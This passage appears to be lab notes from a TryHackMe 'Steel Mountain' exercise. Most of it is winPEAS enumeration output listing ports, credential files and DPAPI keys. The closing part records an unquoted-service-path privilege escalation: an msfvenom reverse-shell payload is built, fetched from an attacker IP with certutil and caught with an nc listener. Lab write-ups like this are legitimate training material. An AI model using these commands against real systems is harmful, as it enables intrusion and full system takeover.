+    C:\Program Files (x86)\IObit\Advanced SystemCare
+    C:\Program Files (x86)\IObit\IObit Uninstaller
+    C:\Program Files\Amazon
+    C:\Program Files\Common Files
+    C:\Program Files\desktop.ini
+    C:\Program Files\Internet Explorer
+    C:\Program Files\Uninstall Information
+    C:\Program Files\Windows Mail
+    C:\Program Files\Windows NT
+    C:\Program Files\WindowsApps
+    C:\Program Files\WindowsPowerShell
+
+
+  [+] Autorun Applications(T1010)
+   [?] Check if you can modify other users AutoRuns binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
+System.Collections.Generic.KeyNotFoundException: The given key was not present in the dictionary.
+   at System.Collections.Generic.Dictionary`2.get_Item(TKey key)
+   at winPEAS.Program.<PrintInfoApplications>g__PrintAutoRuns|44_2()
+
+  [+] Scheduled Applications --Non Microsoft--(T1010)
+   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
+System.IO.FileNotFoundException: Could not load file or assembly 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233' or one of its dependencies. The system cannot find the file specified.
+File name: 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233'
+   at winPEAS.ApplicationInfo.GetScheduledAppsNoMicrosoft()
+   at winPEAS.Program.<PrintInfoApplications>g__PrintScheduled|44_3()
+
+WRN: Assembly binding logging is turned OFF.
+To enable assembly bind failure logging, set the registry value [HKLM\Software\Microsoft\Fusion!EnableLog] (DWORD) to 1.
+Note: There is some performance penalty associated with assembly bind failure logging.
+To turn this feature off, remove the registry value [HKLM\Software\Microsoft\Fusion!EnableLog].
+
+
+
+  =========================================(Network Information)=========================================
+
+  [+] Network Shares(T1135)
+    ADMIN$ (Path: C:\Windows)
+    C$ (Path: C:\)
+    IPC$ (Path: )
+
+  [+] Host File(T1016)
+
+  [+] Network Ifaces and known hosts(T1016)
+   [?] The masks are only for the IPv4 addresses 
+  [X] Exception: The requested protocol has not been configured into the system, or no implementation for it exists
+    Ethernet 2[02:D8:24:BF:46:D3]: 10.10.148.225, fe80::a488:66ed:2295:6a43%14 / 255.255.0.0
+        Gateways: 10.10.0.1
+        DNSs: 10.0.0.2
+    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
+        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+
+  [+] Current Listening Ports(T1049&T1049)
+   [?] Check for services restricted from the outside 
+    Proto     Local Address          Foreing Address        State
+    TCP       0.0.0.0:80                                    Listening
+    TCP       0.0.0.0:135                                   Listening
+    TCP       0.0.0.0:445                                   Listening
+    TCP       0.0.0.0:3389                                  Listening
+    TCP       0.0.0.0:5985                                  Listening
+    TCP       0.0.0.0:8080                                  Listening
+    TCP       0.0.0.0:47001                                 Listening
+    TCP       0.0.0.0:49152                                 Listening
+    TCP       0.0.0.0:49153                                 Listening
+    TCP       0.0.0.0:49154                                 Listening
+    TCP       0.0.0.0:49155                                 Listening
+    TCP       0.0.0.0:49156                                 Listening
+    TCP       0.0.0.0:49162                                 Listening
+    TCP       0.0.0.0:49163                                 Listening
+    TCP       10.10.148.225:139                             Listening
+    TCP       [::]:80                                       Listening
+    TCP       [::]:135                                      Listening
+    TCP       [::]:445                                      Listening
+    TCP       [::]:3389                                     Listening
+    TCP       [::]:5985                                     Listening
+    TCP       [::]:47001                                    Listening
+    TCP       [::]:49152                                    Listening
+    TCP       [::]:49153                                    Listening
+    TCP       [::]:49154                                    Listening
+    TCP       [::]:49155                                    Listening
+    TCP       [::]:49156                                    Listening
+    TCP       [::]:49162                                    Listening
+    TCP       [::]:49163                                    Listening
+    UDP       0.0.0.0:500                                   Listening
+    UDP       0.0.0.0:3389                                  Listening
+    UDP       0.0.0.0:4500                                  Listening
+    UDP       0.0.0.0:5355                                  Listening
+    UDP       10.10.148.225:137                             Listening
+    UDP       10.10.148.225:138                             Listening
+    UDP       [::]:500                                      Listening
+
+  [+] Firewall Rules(T1016)
+   [?] Showing only DENY rules (too many ALLOW rules always) 
+    Current Profiles: PUBLIC
+    FirewallEnabled (Domain):    True
+    FirewallEnabled (Private):    False
+    FirewallEnabled (Public):    False
+    DENY rules:
+
+  [+] DNS cached --limit 70--(T1016)
+    Entry                                 Name                                  Data
+    _ldap._tcp.dc._msdcs.workgroup                                              
+    win8.ipv6.microsoft.com                                                     
+    sqm.telemetry.microsoft.com           sqm.telemetry.microsoft.com           ...elemetry.microsoft.com.nsatc.net
+    sqm.telemetry.microsoft.com           ...elemetry.microsoft.com.nsatc.net   65.55.252.93
+    ...msdcs.eu-west-1.compute.internal                                         
+    isatap.eu-west-1.compute.internal                                           
+    wpad                                                                        
+
+
+  =========================================(Windows Credentials)=========================================
+
+  [+] Checking Windows Vault()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+    Not Found
+
+  [+] Checking Credential manager()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+    This function is not yet implemented.
+    [i] If you want to list credentials inside Credential Manager use 'cmdkey /list'
+
+  [+] Saved RDP connections()
+    Not Found
+
+  [+] Recently run commands()
+    Not Found
+
+  [+] PS default transcripts history()
+    [i] Read the PS histpry inside these files (if any)
+
+  [+] Checking for DPAPI Master Keys()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+    MasterKey: C:\Users\bill\AppData\Roaming\Microsoft\Protect\S-1-5-21-3029548963-3893655183-1231094572-1001\42e32278-f205-450a-a88f-81b4075cdfad
+    Accessed: 10/21/2020 1:11:57 PM
+    Modified: 10/21/2020 1:11:57 PM
+   =================================================================================================
+
+    MasterKey: C:\Users\bill\AppData\Roaming\Microsoft\Protect\S-1-5-21-3029548963-3893655183-1231094572-1001\d456e499-348f-4047-86b6-13258a8ece85
+    Accessed: 9/26/2019 11:29:04 PM
+    Modified: 9/26/2019 11:29:04 PM
+   =================================================================================================
+
+
+  [+] Checking for Credential Files()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+    CredFile: C:\Users\bill\AppData\Roaming\Microsoft\Credentials\16E038FE7CEF476A77403E8E0EE760B8
+    Description: Enterprise Credential Data
+    MasterKey: d456e499-348f-4047-86b6-13258a8ece85
+    Accessed: 9/27/2019 5:22:42 AM
+    Modified: 9/27/2019 5:22:42 AM
+    Size: 506
+   =================================================================================================
+
+    [i] Follow the provided link for further instructions in how to decrypt the creds file
+
+  [+] Checking for RDCMan Settings Files()
+   [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
+    Not Found
+
+  [+] Looking for kerberos tickets()
+   [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
+    Not Found
+
+  [+] Looking saved Wifis()
+    This function is not yet implemented.
+    [i] If you want to list saved Wifis connections you can list the using 'netsh wlan show profile'
+    [i] If you want to get the clear-text password use 'netsh wlan show profile <SSID> key=clear'
+
+  [+] Looking AppCmd.exe()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
+    AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe You should try to search for credentials
+
+  [+] Looking SSClient.exe()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
+    Not Found
+
+  [+] Checking AlwaysInstallElevated(T1012)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated isn't available
+
+  [+] Checking WSUS(T1012)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
+    Not Found
+
+
+  ========================================(Browsers Information)========================================
+
+  [+] Looking for Firefox DBs(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in Firefox history(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for Chrome DBs(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in Chrome history(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Chrome bookmarks(T1217)
+    Not Found
+
+  [+] Current IE tabs(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in IE history(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+
+  [+] IE favorites(T1217)
+    http://go.microsoft.com/fwlink/p/?LinkId=255142
+
+
+  ==============================(Interesting files and registry)==============================
+
+  [+] Putty Sessions()
+    Not Found
+
+  [+] Putty SSH Host keys()
+    Not Found
+
+  [+] SSH keys in registry()
+   [?] If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry
+    Not Found
+
+  [+] Cloud Credentials(T1538&T1083&T1081)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+  [+] Unnattend Files()
+
+  [+] Looking for common SAM & SYSTEM backups()
+
+  [+] Looking for McAfee Sitelist.xml Files()
+
+  [+] Cached GPP Passwords()
+  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.
+
+  [+] Looking for possible regs with creds(T1012&T1214)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
+    Not Found
+    Not Found
+    Not Found
+    Not Found
+
+  [+] Looking for possible password files in users homes(T1083&T1081)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+
+  [+] Looking inside the Recycle Bin for creds files(T1083&T1081&T1145)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+  [+] Searching known files that can contain creds in home(T1083&T1081)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+
+  [+] Looking for documents --limit 100--(T1083)
+    Not Found
+
+  [+] Recent files --limit 70--(T1083&T1081)
+    Not Found
+
+ADVANCED SYSTEMCARE EXECUTABLE VULNERABLE TO UNQUOTEDSERVICEPATH VULNERABILITY
+
+CREATE PAYLOAD TO REPLACE ASCSERVICE.EXE
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.10.169 LPORT=53 -e x86/shikata_ga_nai -f exe -o Advanced.exe
+
+TRANSFER PAYLOAD
+:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\Program Files (x86)\IObit\ 
+cd C:\Program Files (x86)\IObit\
+
+C:\Program Files (x86)\IObit>certutil.exe -urlcache -split -f http://10.11.10.169/Advanced.exe
+certutil.exe -urlcache -split -f http://10.11.10.169/Advanced.exe
+****  Online  ****
+  000000  ...
+  01204a
+CertUtil: -URLCache command completed successfully.
+
+C:\Program Files (x86)\IObit>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Program Files (x86)\IObit
+
+10/21/2020  01:42 PM    <DIR>          .
+10/21/2020  01:42 PM    <DIR>          ..
+10/21/2020  01:02 PM    <DIR>          Advanced SystemCare
+10/21/2020  01:42 PM            73,802 Advanced.exe
+09/26/2019  10:35 PM    <DIR>          IObit Uninstaller
+09/26/2019  08:18 AM    <DIR>          LiveUpdate
+               1 File(s)         73,802 bytes
+               5 Dir(s)  44,156,047,360 bytes free
+
+STOP THE ADVANCE SERVICE
+C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
+sc stop AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+START THE ADVANCED SERVICE
+C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
+sc start AdvancedSystemCareService9
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+START NC LISTENER AND GET ROOT REVERSE SHELL
+root@kali:~/tryhackme/steelmountain# nc -lvp 53
+listening on [any] 53 ...
+10.10.148.225: inverse host lookup failed: Unknown host
+connect to [10.11.10.169] from (UNKNOWN) [10.10.148.225] 49270
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>certutil.exe -urlcache -split -f http://10.11.10.169/Advanced.exe
+certutil.exe -urlcache -split -f http://10.11.10.169/Advanced.exe
